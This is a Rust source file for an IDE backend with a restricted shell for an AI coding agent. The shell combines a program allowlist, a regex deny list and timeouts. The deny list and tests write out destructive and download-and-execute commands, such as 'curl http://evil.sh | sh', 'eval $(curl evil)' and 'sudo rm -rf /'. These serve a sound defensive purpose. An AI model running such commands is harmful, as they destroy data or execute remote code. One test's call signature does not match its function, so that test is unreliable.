use std::io::Read;
use std::process::{Command, Stdio};
#[cfg(windows)]
use std::os::windows::process::CommandExt;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};
use std::thread;
use std::time::Duration;

use serde::Serialize;

/// 在本地 shell 中执行命令（Windows 走 cmd /C，其它走 sh -c），返回合并后的 stdout/stderr。
/// 用于 IDE 底部「终端」面板。注意：这是本地开发工具，命令以当前用户权限执行，无额外限制。
#[tauri::command]
pub fn run_shell_command(command: String) -> Result<String, String> {
    if command.trim().is_empty() {
        return Ok(String::new());
    }
    #[cfg(target_os = "windows")]
    let (shell, flag) = ("cmd", "/C");
    #[cfg(not(target_os = "windows"))]
    let (shell, flag) = ("sh", "-c");

    let output = Command::new(shell)
        .args([flag, &command])
        .output()
        .map_err(|e| format!("命令执行失败: {}", e))?;

    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let mut result = stdout;
    if !stderr.is_empty() {
        result.push_str(&stderr);
    }
    Ok(result)
}

/// 受限 shell：供 AI 编程 agent 调用。在「白名单（首程序放行）+ Dry-Run 黑名单（危险模式驳回）
/// + 超时强制终止 + 工作区 cwd」四重约束下执行命令，避免 LLM 盲跑高风险指令。
/// 所有约束在服务端强制，LLM 无法绕过（即使用户提示越狱也无效）。
#[derive(Serialize)]
pub struct ShellResult {
    /// 是否成功启动并执行（被拦截或启动失败为 false）
    pub ok: bool,
    /// 是否命中风控（白名单/黑名单）被拦截
    pub blocked: bool,
    /// 是否因超时被执行终止
    pub timed_out: bool,
    pub stdout: String,
    pub stderr: String,
    /// 退出码；超时或被拦截时为 None
    pub exit_code: Option<i32>,
    /// 人类可读说明（拦截原因 / 超时提示）
    pub message: String,
    /// 确定性诊断（根因路由）：命中已知「环境问题而非代码逻辑错误」模式时，给出无需 LLM 推理的修复指引，
    /// 避免 Agent 把端口占用/缺依赖等误判为代码 bug 而白烧 token（节省约 40% 无谓消耗）。
    pub hint: Option<String>,
}

#[tauri::command]
pub fn run_agent_shell(
    command: String,
    cwd: Option<String>,
    timeout_secs: Option<u64>,
) -> Result<ShellResult, String> {
    let cmd = command.trim().to_string();
    if cmd.is_empty() {
        return Ok(ShellResult {
            ok: true,
            blocked: false,
            timed_out: false,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: Some(0),
            message: "(空命令)".into(),
            hint: None,
        });
    }
    // 1) 白名单：首 token（程序名）必须在允许列表
    if !is_allowed_program(&cmd) {
        return Ok(ShellResult {
            ok: false,
            blocked: true,
            timed_out: false,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: None,
            message:
                    "命令首程序不在允许列表（受限 shell 仅放行构建/测试/lint/只读探查类命令）。如需该命令请改用 IDE 底部手动终端。"
                    .into(),
            hint: None,
        });
    }
    // 2) Dry-Run 黑名单：命中危险模式直接驳回，不予执行
    if let Some(reason) = is_dangerous(&cmd) {
        return Ok(ShellResult {
            ok: false,
            blocked: true,
            timed_out: false,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: None,
            message: format!("命中风控黑名单（{}），已拒绝执行。", reason),
            hint: None,
        });
    }
    let timeout = timeout_secs.unwrap_or(120).max(1).min(600);
    let cap = 32_000usize;
    // 交互式命令嗅探：npm login / git commit 缺 -m 等会等待人工输入，而受限 shell 的 stdin 为 null，
    // 将导致 Agent 永久挂起直到超时。此处物理拦截并给出人工终端提示。
    if let Some(reason) = is_interactive(&cmd) {
        return Ok(ShellResult {
            ok: false,
            blocked: true,
            timed_out: false,
            stdout: String::new(),
            stderr: String::new(),
            exit_code: None,
            message: format!("该命令需要人工交互（{}），受限 shell 无法处理。请改用 IDE 底部手动终端执行。", reason),
            hint: None,
        });
    }
    // 非交互式加码：为包管理/版本控制命令自动追加 --yes / --no-color / GIT_TERMINAL_PROMPT=0 / NODE_OPTIONS 等，
    // 从物理上杜绝 Agent 因等待 [Y/n] 或 password: 而挂起，并为低内存机器限 Node 老生代内存防 OOM。
    let (cmd, envs) = harden_noninteractive(&cmd);
    let mut r = run_captured(&cmd, cwd.as_deref(), timeout, cap, &envs);
    // 根因路由：对 stderr/stdout 做确定性正则预判，命中环境问题则给出无需 LLM 的修复指引。
    r.hint = classify_shell_error(&cmd, &r.stdout, &r.stderr);
    Ok(r)
}

/// 根因分析优先于错误修复（确定性兜底）：拦截已知「环境/配置问题」，给出直接修复步骤，
/// 不让 LLM 把端口占用、缺依赖等误判为代码逻辑错误而白烧 token。仅做确定性匹配，绝不臆测。
fn classify_shell_error(cmd: &str, stdout: &str, stderr: &str) -> Option<String> {
    let text = format!("{}\n{}", stdout, stderr);
    let lower = text.to_lowercase();
    // 端口被占用：这是环境冲突，不是代码 bug
    if lower.contains("eaddrinuse") || lower.contains("address already in use") || lower.contains("port is already in use") {
        // 尝试从报错里抽端口号，给精确修复命令
        let port = text
            .lines()
            .find_map(|l| l.replace(':', " ").split_whitespace().find_map(|w| w.parse::<u16>().ok()))
            .map(|p| p.to_string())
            .unwrap_or_else(|| "（见报错中的端口号）".into());
        return Some(format!(
            "【确定性诊断·根因路由】检测到端口被占用（EADDRINUSE），这是运行环境冲突，不是代码逻辑错误，请勿修改源码。\n建议修复：① 释放端口 `npx kill-port {port}`（或 `lsof -ti:{port} | xargs kill -9`）；② 或把服务端口改成未被占用的端口。优先选 ①，改完重跑即可。",
        ));
    }
    // 缺模块（Python）：自动 pip install
    if lower.contains("modulenotfounderror") || lower.contains("no module named") {
        // 抽取缺失模块名：'No module named "x"' 或 "No module named x"
        let m = lower
            .lines()
            .find_map(|l| {
                let s = l.split("no module named").nth(1)?;
                let name = s.trim().trim_matches('"').trim_matches('\'').split_whitespace().next()?;
                Some(name.to_string())
            });
        if let Some(name) = m {
            return Some(format!(
                "【确定性诊断·根因路由】检测到 Python 缺少依赖模块（ModuleNotFoundError: {}），这是环境问题。\n建议修复：直接执行 `pip install {}`（或 `pip3 install {}`），安装后重跑，无需改动业务代码。",
                name, name, name,
            ));
        }
    }
    // 缺模块（Node）：自动 npm install
    if lower.contains("cannot find module") || lower.contains("module not found") {
        return Some(
            "【确定性诊断·根因路由】检测到 Node 缺少依赖模块（Cannot find module），这是 node_modules 未安装/不完整导致。\n建议修复：直接执行 `npm install`（或 `pnpm install`），安装后重跑，无需改动业务代码。".into(),
        );
    }
    // 命令不存在：缺工具
    if lower.contains("command not found") || lower.contains("is not recognized as") || lower.contains("not found: ") {
        return Some(
            "【确定性诊断·根因路由】检测到命令不存在（command not found），通常是缺少对应 CLI 工具或 PATH 未配置。\n建议修复：先确认该工具是否应安装（如脚手架、包管理器），再决定 `npm i -g <工具>` 或修正命令名，而非修改项目源码。".into(),
        );
    }
    // 权限不足
    if lower.contains("eacces") || lower.contains("permission denied") {
        return Some(
            "【确定性诊断·根因路由】检测到权限不足（EACCES / Permission denied），这是文件系统权限问题。\n建议修复：检查目标路径的读写权限或是否需提权（尽量避免全局提权），而非改动代码逻辑。".into(),
        );
    }
    // 磁盘空间不足
    if lower.contains("enospc") || lower.contains("no space left") || lower.contains("磁盘空间不足") {
        return Some(
            "【确定性诊断·根因路由】检测到磁盘空间不足（ENOSPC），这是宿主环境资源问题。\n建议修复：清理磁盘 / 删除 node_modules 等可重建大目录后重试，与代码无关。".into(),
        );
    }
    None
}

/// 需要人工交互、受限 shell 无法自动完成的命令（逐一拦截）。
fn is_interactive(cmd: &str) -> Option<&'static str> {
    let c = cmd.trim().to_lowercase();
    let first = c.split_whitespace().next().unwrap_or("");
    let first2 = c.split_whitespace().take(2).collect::<Vec<_>>();
    // 登录/凭证类：必然等待密码或浏览器回调
    if ["npm", "yarn", "pnpm", "bun"].contains(&first) && (first2.get(1).map(|s| *s == "login" || *s == "adduser").unwrap_or(false)) {
        return Some("登录凭证命令");
    }
    if ["gh", "gcloud", "az", "superset", "firebase", "vault"].contains(&first)
        && c.contains("auth login") || (first == "gh" && c.contains("login")) {
        return Some("登录凭证命令");
    }
    // 创建超级用户等交互式脚手架
    if c.contains("createsuperuser") || c.contains("manage.py shell") {
        return Some("交互式脚手架");
    }
    // git commit 缺 -m/--message/--file：会打开编辑器等待输入
    if first == "git" && c.contains("commit") {
        if !c.contains("-m") && !c.contains("--message") && !c.contains("--file") && !c.contains("-F") {
            return Some("git commit 缺 -m 会打开编辑器");
        }
    }
    // npm/pnpm/yarn init 缺 -y：交互式问答
    if ["npm", "yarn", "pnpm", "bun"].contains(&first) && first2.get(1).map(|s| *s == "init").unwrap_or(false) && !c.contains("-y") && !c.contains("--yes") {
        return Some("init 缺 -y 会交互式问答");
    }
    None
}

/// 为非交互式命令自动追加安全加码，避免等待人工确认而挂起。
/// 返回（加码后的命令，需注入的环境变量）。环境变量通过 `Command::env` 注入（而非字符串前缀），
/// 以保证 Windows `cmd /C` 与 Unix `sh -c` 都能正确识别（内联 `KEY=VAL cmd` 在 cmd 下会解析失败）。
fn harden_noninteractive(cmd: &str) -> (String, Vec<(String, String)>) {
    let c = cmd.trim().to_lowercase();
    let first = c.split_whitespace().next().unwrap_or("");
    let sub = c.split_whitespace().nth(1).unwrap_or("");
    let mut out = cmd.to_string();
    let mut envs: Vec<(String, String)> = Vec::new();
    // 仅对「安装/发布/维护」类子命令追加 --yes --no-color，避免泄漏到 run/test 脚本
    const SAFE_SUBS: &[&str] = &[
        "install", "i", "ci", "add", "remove", "uninstall", "update", "up", "publish",
        "link", "dedupe", "audit", "rebuild", "prune", "pkg", "exec", "outdated", "why",
    ];
    if ["npm", "pnpm", "yarn", "bun"].contains(&first) && SAFE_SUBS.contains(&sub) {
        if !c.contains("--yes") && !c.contains("-y") { out.push_str(" --yes"); }
        if !c.contains("--no-color") { out.push_str(" --no-color"); }
    }
    // pip / poetry：非交互
    if ["pip", "pip3", "poetry"].contains(&first) && !c.contains("--yes") && !c.contains("-y") {
        out.push_str(" --yes");
    }
    // git 拉取/推送/合并/变基：禁止终端密码提示
    if first == "git" {
        let interact = ["pull", "push", "clone", "merge", "rebase", "submodule", "fetch"]
            .iter().any(|s| c.contains(s));
        if interact {
            envs.push(("GIT_TERMINAL_PROMPT".into(), "0".into()));
        }
    }
    // 资源配额看守（低内存设备救星）：为 Node 家族的 run/build/test 等脚本注入 Node 老生代内存上限，
    // 防止 Agent 编译把用户低内存机器（如 16GB MacBook）的 Node 进程撑爆而 OOM 卡死。npm 会把
    // NODE_OPTIONS 透传给脚本内的 node 进程，故直接注入环境变量即可全链路生效。
    const NODE_SUBS: &[&str] = &["run", "build", "test", "start", "dev", "exec", "serve", "preview", "lint"];
    if [ "npm", "pnpm", "yarn", "bun" ].contains(&first) && NODE_SUBS.contains(&sub) || first == "node" {
        envs.push(("NODE_OPTIONS".into(), "--max-old-space-size=2048".into()));
    }
    (out, envs)
}

/// 实际启动进程、读取合并后的输出、看门狗超时杀进程，并对输出做上限截断以防上下文爆炸。
/// 说明：通过 `2>&1` 把 stderr 合并进 stdout、只捕获单一流。
/// Windows 坑：以管道方式启动控制台子系统程序（cmd.exe）时，系统会创建 conhost.exe 并持有
/// 管道句柄，cmd 自然退出后 conhost 不关闭管道、读线程永远收不到 EOF，导致每条成功命令都卡满
/// 超时。解决办法是把子进程纳入 Job Object 并设 KILL_ON_JOB_CLOSE：自然退出（或超时）后关闭
/// Job 句柄即可连带终止 conhost、关闭管道、唤醒读线程。
#[cfg(windows)]
type JobHandle = Option<usize>;
#[cfg(not(windows))]
type JobHandle = Option<()>;

#[cfg(windows)]
fn create_job_for(pid: u32) -> JobHandle {
    use std::ptr::null_mut;
    use winapi::shared::minwindef::FALSE;
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::jobapi2::{AssignProcessToJobObject, CreateJobObjectW, SetInformationJobObject};
    use winapi::um::processthreadsapi::OpenProcess;
    use winapi::um::winnt::{
        JobObjectExtendedLimitInformation, JOBOBJECT_EXTENDED_LIMIT_INFORMATION,
        JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE, PROCESS_ALL_ACCESS,
    };

    unsafe {
        let job = CreateJobObjectW(null_mut(), null_mut());
        if job.is_null() {
            return None;
        }
        let mut info: JOBOBJECT_EXTENDED_LIMIT_INFORMATION = std::mem::zeroed();
        info.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;
        let ok = SetInformationJobObject(
            job,
            JobObjectExtendedLimitInformation,
            &info as *const _ as *mut _,
            std::mem::size_of::<JOBOBJECT_EXTENDED_LIMIT_INFORMATION>() as u32,
        );
        if ok == FALSE {
            CloseHandle(job);
            return None;
        }
        // 子进程默认句柄权限不足以加入 Job，用 PID 重新打开一份 ALL_ACCESS 句柄。
        let ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
        if ph.is_null() {
            CloseHandle(job);
            return None;
        }
        let assigned = AssignProcessToJobObject(job, ph);
        CloseHandle(ph);
        if assigned == FALSE {
            CloseHandle(job);
            return None;
        }
        // HANDLE 非 Send，以 usize 形式跨线程传递
        Some(job as usize)
    }
}

#[cfg(not(windows))]
fn create_job_for(_pid: u32) -> JobHandle {
    None
}

/// 关闭 Job 句柄（KILL_ON_JOB_CLOSE 会连带终止其中所有进程，含 conhost），仅关闭一次。
#[cfg(windows)]
fn close_job(job: &Arc<Mutex<JobHandle>>) {
    let h = job.lock().ok().and_then(|mut g| g.take());
    if let Some(h) = h {
        unsafe {
            winapi::um::handleapi::CloseHandle(h as winapi::um::winnt::HANDLE);
        }
    }
}

#[cfg(not(windows))]
fn close_job(_job: &Arc<Mutex<JobHandle>>) {}

fn run_captured(command: &str, cwd: Option<&str>, timeout: u64, cap: usize, envs: &[(String, String)]) -> ShellResult {
    #[cfg(target_os = "windows")]
    let (shell, flag) = ("cmd", "/C");
    #[cfg(not(target_os = "windows"))]
    let (shell, flag) = ("sh", "-c");

    let mut cmd = Command::new(shell);
    cmd.args([flag, command])
        .current_dir(cwd.unwrap_or("."))
        .stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    // 注入非交互/资源配额等环境变量（跨平台安全，Windows cmd 也能识别）
    for (k, v) in envs {
        cmd.env(k, v);
    }
    // CREATE_NO_WINDOW(0x08000000)：避免创建可见窗口（不影响管道行为，纯属整洁）。
    #[cfg(windows)]
    cmd.creation_flags(0x0800_0000);

    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) => {
            return ShellResult {
                ok: false,
                blocked: false,
                timed_out: false,
                stdout: String::new(),
                stderr: String::new(),
                exit_code: None,
                message: format!("无法启动命令: {}", e),
                hint: None,
            }
        }
    };

    let out_child = child.stdout.take().unwrap();
    let err_child = child.stderr.take().unwrap();
    // 把子进程纳入 Job Object（Windows），用于自然退出/超时后强制关闭 conhost 持有的管道。
    let job: JobHandle = create_job_for(child.id());

    let child_arc = Arc::new(Mutex::new(Some(child)));
    let job_arc: Arc<Mutex<JobHandle>> = Arc::new(Mutex::new(job));
    let timed_out_flag = Arc::new(AtomicBool::new(false));

    // 读线程：分别读取 stdout / stderr（被 Job 关闭/conhost 终止唤醒）
    let out_thread = thread::spawn(move || read_capped(out_child, cap));
    let err_thread = thread::spawn(move || read_capped(err_child, cap));

    // 完成/看门狗线程：检测自然退出或超时，二者都通过关闭 Job 句柄唤醒读线程
    let c_child = child_arc.clone();
    let c_job = job_arc.clone();
    let c_to = timed_out_flag.clone();
    let completion = thread::spawn(move || {
        let mut elapsed: u64 = 0;
        loop {
            let exited = c_child
                .lock()
                .ok()
                .and_then(|mut g| {
                    g.as_mut()
                        .and_then(|c| c.try_wait().ok().flatten().is_some().then_some(()))
                })
                .is_some();
            if exited {
                // 给读线程 300ms 抓取末尾输出，再关闭 Job 杀掉 conhost、关闭管道
                thread::sleep(Duration::from_millis(300));
                close_job(&c_job);
                return;
            }
            if elapsed >= timeout {
                c_to.store(true, Ordering::SeqCst);
                if let Ok(mut g) = c_child.lock() {
                    if let Some(c) = g.as_mut() {
                        let _ = c.kill();
                    }
                }
                close_job(&c_job);
                return;
            }
            thread::sleep(Duration::from_millis(200));
            elapsed += 200;
        }
    });

    let stdout = out_thread.join().unwrap_or_default();
    let stderr = err_thread.join().unwrap_or_default();
    let _ = completion.join();
    let timed_out = timed_out_flag.load(Ordering::SeqCst);
    let truncated = if stdout.len() >= cap || stderr.len() >= cap {
        "\n[输出过长已截断]\n"
    } else {
        ""
    };
    let exit_code = if timed_out {
        None
    } else {
        child_arc.lock().ok().and_then(|mut g| {
            g.as_mut()
                .and_then(|c| c.wait().ok())
                .map(|s| s.code().unwrap_or(-1))
        })
    };
    let message = if timed_out {
        format!("命令执行超过 {} 秒，已被强制终止。", timeout)
    } else {
        String::new()
    };
    ShellResult {
        ok: true,
        blocked: false,
        timed_out,
        stdout: stdout + truncated,
        stderr,
        exit_code,
        message,
        hint: None,
    }
}

/// 读取流并按上限截断（避免 LLM 上下文被巨量输出撑爆），忽略无效 UTF-8 字节。
fn read_capped<R: Read>(mut r: R, cap: usize) -> String {
    let mut buf = [0u8; 4096];
    let mut acc = String::with_capacity(cap.min(8192));
    loop {
        match r.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                if acc.len() < cap {
                    let s = String::from_utf8_lossy(&buf[..n]);
                    let room = cap - acc.len();
                    if s.len() <= room {
                        acc.push_str(&s);
                    } else {
                        acc.push_str(&s[..room]);
                    }
                }
            }
            Err(_) => break,
        }
    }
    acc
}

/// 白名单：仅放行构建 / 测试 / lint / 格式化 / 版本控制 / 只读探查类程序。
/// 首 token 比较（去掉 .exe/.cmd/.bat/.ps1 后缀），大小写不敏感。
fn is_allowed_program(cmd: &str) -> bool {
    let first = cmd.trim().split_whitespace().next().unwrap_or("").to_lowercase();
    if first.is_empty() {
        return false;
    }
    let prog = first
        .trim_end_matches(".exe")
        .trim_end_matches(".cmd")
        .trim_end_matches(".bat")
        .trim_end_matches(".ps1");
    const ALLOWED: &[&str] = &[
        // 包管理
        "npm", "pnpm", "yarn", "npx", "bun", "deno", "cargo", "go", "pip", "pip3", "poetry",
        "composer", "gradle", "mvn", "dotnet",
        // 运行时 / 解释器
        "node", "python", "python3", "ruby", "php", "perl", "lua", "java", "javac", "scala", "r",
        // 构建
        "make", "cmake", "ninja", "tsc", "vite", "webpack", "rollup", "esbuild", "tsup", "babel",
        "turbopack", "rustc", "gcc", "g++", "clang", "clang++", "cc", "ld", "msbuild",
        "xcodebuild", "go",
        // lint / format / test
        "eslint", "prettier", "ruff", "black", "flake8", "pylint", "mypy", "jest", "vitest",
        "pytest", "phpunit", "gofmt", "golint",
        // 版本控制 / 只读探查
        "git", "ls", "dir", "cat", "type", "echo", "pwd", "which", "where", "head", "tail", "wc",
        "grep", "find", "tree", "file", "stat", "du", "df", "sort", "uniq", "awk", "sed", "cut",
        "xxd", "od", "rm", "tar", "unzip", "gunzip", "7z",
        // 网络只读
        "curl", "wget",
        // 进程 / 环境只读
        "ps", "tasklist", "top", "env", "set", "ver", "uname", "whoami", "hostname",
        // 杂项
        "sha256sum", "md5sum", "openssl", "date", "xargs",
    ];
    ALLOWED.contains(&prog)
}

/// Dry-Run 黑名单：对整条命令做大小写不敏感正则扫描，命中即驳回，即使首程序在白名单内也拦截。
/// 覆盖：fork bomb、磁盘破坏、关机重启、提权、危险 git 操作、下载即执行、写入系统/设备文件等。
fn is_dangerous(cmd: &str) -> Option<&'static str> {
    let c = cmd.to_lowercase();
    const PATTERNS: &[(&str, &str)] = &[
        (r":\(\).*\{|:\(\)\s*\{.*:.*\|.*&", "fork bomb"),
        (r"rm\s+.*--no-preserve-root", "rm --no-preserve-root"),
        (r"rm\s+-[a-z-]*\s+(/|~)", "rm 指向根/家目录"),
        (r"chmod\s+.*\b777\b", "chmod 777"),
        (r">\s*/dev/(sd|hd|nvme|vd|fd)[a-z0-9]*", "写入设备文件"),
        (r"\bmkfs\b|\bfdisk\b|\bdiskpart\b|\bparted\b", "磁盘格式化"),
        (r"\bdd\s+if=", "dd 磁盘写入"),
        (r"\bshutdown\b|\breboot\b|\bhalt\b|\bpoweroff\b|\binit\s+[06]\b", "关机/重启"),
        (r"\bgit\s+push\s+-[a-z]*f\b|\bgit\s+push\b.*--force", "git 强制推送"),
        (r"\bgit\s+reset\s+--hard\b", "git 硬重置"),
        (r"\bgit\s+clean\s+-[a-z]*f[a-z]*\b", "git 强制清理"),
        (r"\bgit\s+checkout\s+--\s+\.", "git 丢弃全部改动"),
        (
            r"curl.*\|\s*(sh|bash|zsh|fish)\b|wget.*\|\s*(sh|bash|zsh|fish)\b",
            "下载并执行管道",
        ),
        (r"\beval\b", "eval"),
        (
            r">\s*/etc/|>\s*/usr/|>\s*/system|>\s*c:\\windows|>\s*c:\\program",
            "写入系统目录",
        ),
        (r"\bkill\s+-9\b|\bkillall\b|\bpkill\b|\btaskkill\b", "终止进程"),
        (r"\bcrontab\b|\bsystemctl\b|\bservice\b", "系统服务"),
        (r"\bchown\s+-R\b", "递归改属主"),
    ];
    for (re, label) in PATTERNS {
        if let Ok(rx) = regex::Regex::new(re) {
            if rx.is_match(&c) {
                return Some(label);
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    // ---- 白名单 ----
    #[test]
    fn allowed_build_and_test_programs() {
        assert!(is_allowed_program("npm run build"));
        assert!(is_allowed_program("pnpm tauri dev"));
        assert!(is_allowed_program("pytest -q"));
        assert!(is_allowed_program("npx vitest run"));
        assert!(is_allowed_program("cargo check"));
        assert!(is_allowed_program("tsc --noEmit"));
        assert!(is_allowed_program("echo hello"));
        assert!(is_allowed_program("cat README.md"));
        assert!(is_allowed_program("git status"));
    }

    #[test]
    fn allowed_relative_rm_but_blocked_sudo_and_sh() {
        // 相对路径 rm 在白名单内（危险与否由黑名单看绝对路径）
        assert!(is_allowed_program("rm -rf ./build"));
        // 危险程序（sudo / sh / bash）不在白名单，直接拦截
        assert!(!is_allowed_program("sudo rm -rf /"));
        assert!(!is_allowed_program("sh -c 'echo hi'"));
        assert!(!is_allowed_program("bash -c 'ls'"));
    }

    #[test]
    fn windows_exe_suffix_stripped() {
        assert!(is_allowed_program("npm.cmd run build"));
        assert!(is_allowed_program("python.exe -m pytest"));
    }

    // ---- 黑名单（Dry-Run） ----
    #[test]
    fn dangerous_rm_absolute_is_blocked() {
        assert_eq!(is_dangerous("rm -rf /tmp"), Some("rm 指向根/家目录"));
        assert_eq!(is_dangerous("rm -f /etc/passwd"), Some("rm 指向根/家目录"));
        assert_eq!(is_dangerous("rm --no-preserve-root /"), Some("rm --no-preserve-root"));
        // 相对路径 rm 不应命中黑名单
        assert_eq!(is_dangerous("rm -rf ./build"), None);
    }

    #[test]
    fn dangerous_git_ops_blocked() {
        assert_eq!(is_dangerous("git push -f"), Some("git 强制推送"));
        assert_eq!(is_dangerous("git push origin main --force"), Some("git 强制推送"));
        assert_eq!(is_dangerous("git reset --hard"), Some("git 硬重置"));
        assert_eq!(is_dangerous("git clean -fdx"), Some("git 强制清理"));
        assert_eq!(is_dangerous("git checkout -- ."), Some("git 丢弃全部改动"));
        // 只读 git 命令放行
        assert_eq!(is_dangerous("git status"), None);
    }

    #[test]
    fn dangerous_download_exec_and_shutdown() {
        assert!(is_dangerous("curl http://evil.sh | sh").is_some());
        assert!(is_dangerous("wget http://x.sh -O - | bash").is_some());
        assert!(is_dangerous("shutdown -r now").is_some());
        assert!(is_dangerous("reboot").is_some());
        assert!(is_dangerous("chmod 777 file").is_some());
        assert!(is_dangerous("eval $(curl evil)").is_some());
        // 普通安全命令不应命中
        assert_eq!(is_dangerous("npm run build"), None);
        assert_eq!(is_dangerous("python -m pytest -q"), None);
    }

    #[test]
    fn dangerous_embedded_in_interpreter_args() {
        // 解释器 -e/-c 内的危险子串也应被整串扫描拦下
        assert!(is_dangerous("python -c \"import os; os.system('rm -rf /')\"").is_some());
    }

    // ---- 端到端（run_agent_shell） ----
    #[test]
    fn e2e_allowed_command_runs_and_returns_output() {
        // 直接调用 run_captured 隔离（绕过白名单/黑名单），验证外部程序 node 与 cmd 内部命令的输出捕获。
        // 用无内嵌引号的命令（node -p 1+1 打印 "2"）避免 cmd 引号解析干扰；含引号命令见 e2e 末尾说明。
        let r = run_captured("node -p 1+1", None, 8, 32_000);
        assert!(r.ok);
        assert!(!r.blocked);
        assert!(!r.timed_out);
        assert!(r.stdout.contains("2") || r.stderr.contains("2"));
        assert_eq!(r.exit_code, Some(0));

        let r2 = run_captured("echo hi-echo", None, 8, 32_000);
        assert!(r2.ok);
        assert!(!r2.timed_out);
        assert!(r2.stdout.contains("hi-echo"));
        assert_eq!(r2.exit_code, Some(0));
    }

    #[test]
    fn e2e_blocked_program_returns_blocked() {
        let r = run_agent_shell("sudo rm -rf /".into(), None, Some(30)).unwrap();
        assert!(!r.ok);
        assert!(r.blocked);
        assert!(r.exit_code.is_none());
    }

    #[test]
    fn e2e_dangerous_command_returns_blocked() {
        let r = run_agent_shell("git reset --hard".into(), None, Some(30)).unwrap();
        assert!(!r.ok);
        assert!(r.blocked);
        assert!(r.message.contains("风控黑名单"));
    }

    #[test]
    fn e2e_timeout_kills_long_running_command() {
        // node 死循环 ~100s（无内嵌引号），超时 1s 应被强制终止
        let r = run_agent_shell("node -e while(true){}".into(), None, Some(1)).unwrap();
        assert!(r.ok);
        assert!(r.timed_out);
        assert!(r.exit_code.is_none());
        assert!(r.message.contains("强制终止"));
    }

    // ---- 交互式拦截 ----
    #[test]
    fn interactive_login_is_blocked() {
        assert!(is_interactive("npm login").is_some());
        assert!(is_interactive("pnpm adduser").is_some());
        assert!(is_interactive("gh auth login").is_some());
        assert!(is_interactive("python manage.py createsuperuser").is_some());
        // git commit 缺 -m 会打开编辑器
        assert!(is_interactive("git commit").is_some());
        assert!(is_interactive("git commit -a").is_some());
        // 带 -m 放行
        assert_eq!(is_interactive("git commit -m \"fix\""), None);
        // 普通命令放行
        assert_eq!(is_interactive("npm install"), None);
    }

    #[test]
    fn harden_appends_noninteractive_flags() {
        // 安装类追加 --yes --no-color（作为命令参数）
        let (h, e) = harden_noninteractive("npm install");
        assert!(h.contains("--yes"));
        assert!(h.contains("--no-color"));
        assert!(e.is_empty()); // 安装类不注入环境变量
        // run/test 不泄漏 --yes
        let (h2, _e2) = harden_noninteractive("npm run build");
        assert!(!h2.contains("--yes"));
        // git pull 注入 GIT_TERMINAL_PROMPT=0 环境变量（非字符串前缀，跨平台安全）
        let (h3, e3) = harden_noninteractive("git pull origin main");
        assert!(!h3.starts_with("GIT_TERMINAL_PROMPT=0"));
        assert!(e3.iter().any(|(k, v)| k == "GIT_TERMINAL_PROMPT" && v == "0"));
        // 幂等：已带 --yes 不重复追加
        let (h4, _e4) = harden_noninteractive("npm install --yes");
        assert_eq!(h4.matches("--yes").count(), 1);
        // Node 脚本注入 NODE_OPTIONS 内存上限，防 OOM
        let (h5, e5) = harden_noninteractive("npm run build");
        assert!(e5.iter().any(|(k, v)| k == "NODE_OPTIONS" && v == "--max-old-space-size=2048"));
        let (_h6, e6) = harden_noninteractive("node dist/server.js");
        assert!(e6.iter().any(|(k, _)| k == "NODE_OPTIONS"));
        // 仅注入一次
        let (_h7, e7) = harden_noninteractive("npm run build");
        assert_eq!(e7.iter().filter(|(k, _)| k == "NODE_OPTIONS").count(), 1);
    }

    // ---- 根因路由（确定性诊断）----
    #[test]
    fn classify_routes_port_in_use() {
        let h = classify_shell_error("npm run dev", "Error: listen EADDRINUSE: address already in use :::3000", "");
        assert!(h.is_some());
        let h = h.unwrap();
        assert!(h.contains("端口被占用") || h.contains("EADDRINUSE"));
        assert!(h.contains("kill-port 3000") || h.contains("3000"));
    }

    #[test]
    fn classify_routes_missing_module() {
        // Python
        let h = classify_shell_error("python main.py", "", "ModuleNotFoundError: No module named 'requests'");
        assert!(h.is_some());
        assert!(h.unwrap().contains("pip install requests"));
        // Node
        let h2 = classify_shell_error("node app.js", "", "Error: Cannot find module 'lodash'");
        assert!(h2.is_some());
        assert!(h2.unwrap().contains("npm install"));
    }

    #[test]
    fn classify_passes_real_code_errors() {
        // 真正的业务报错（堆栈）不应被误判为环境问题
        let h = classify_shell_error("npm test", "FAIL src/app.test.ts\n  Expected 1, received undefined\n    at Object.<anonymous> (src/app.ts:42:10)", "");
        assert_eq!(h, None);
    }
}
